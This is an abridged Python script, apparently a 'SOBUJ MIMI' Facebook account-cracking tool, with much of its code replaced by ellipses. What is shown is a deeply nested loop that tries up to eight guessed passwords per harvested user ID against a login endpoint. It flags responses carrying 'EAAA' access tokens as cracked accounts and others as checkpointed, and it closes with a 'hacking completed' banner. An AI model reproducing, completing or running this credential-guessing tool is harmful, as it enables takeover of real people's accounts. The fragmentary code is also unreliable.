...
#DON'T FORGET TO GIVE CREDIT TO SOBUJ MIMI
...
def logo():
	...
	os.system('echo "\n..######...#######..########..##.....##.......##\n.##....##.##.....##.##.....##.##.....##.......##\n.##.......##.....##.##.....##.##.....##.......##\n..######..##.....##.########..##.....##.......##\n.......##.##.....##.##.....##.##.....##.##....##\n.##....##.##.....##.##.....##.##.....##.##....##\n..######...#######..########...#######...######.\n \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: {SOBUJ MIMI}        ║\n    ║ AUTHOR   : 🔥 SOBUJ MIMI X SOBUJ VAU🔥       ║\n    ║ GITHUB   : git.io/sobujmimi     ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
...
def SOBUJ():
	...
	print("\t\033[93;1m      SOBUJ MENU\x1b[0m")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/100032908844652/posts/598814021225554/?substory_index=2&app=fbl"])
		...
		try:
			...
			os.system("git clone https://github.com/sobujmimi/fcpro")
...
def menu():
    ...
    print("\033[93;1m     SOBUJ MIMI : \033[92;1m"+xn)
...
def crack_select1():
	...
	if select =="1":
		...
		print("\t\033[92;1m SOBUJ MIMI PUBLIC ID COINING ")
	...
	print("\033[94;1m  WAIT AND SEE SOBUJ MIMI MAGIC\033[92;1m✘\033[91;1m✘\x1b[0m")
	...
	def SOBUJ(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass7+"\033[0;97m")
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[SOBUJ-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[MIMI-CP] "+uid+" | "+pass8+"\033[0;97m")
	...
	print("\033[92;1m SOBUJ MIMI HACKING HAS BEEN COMPLETED")
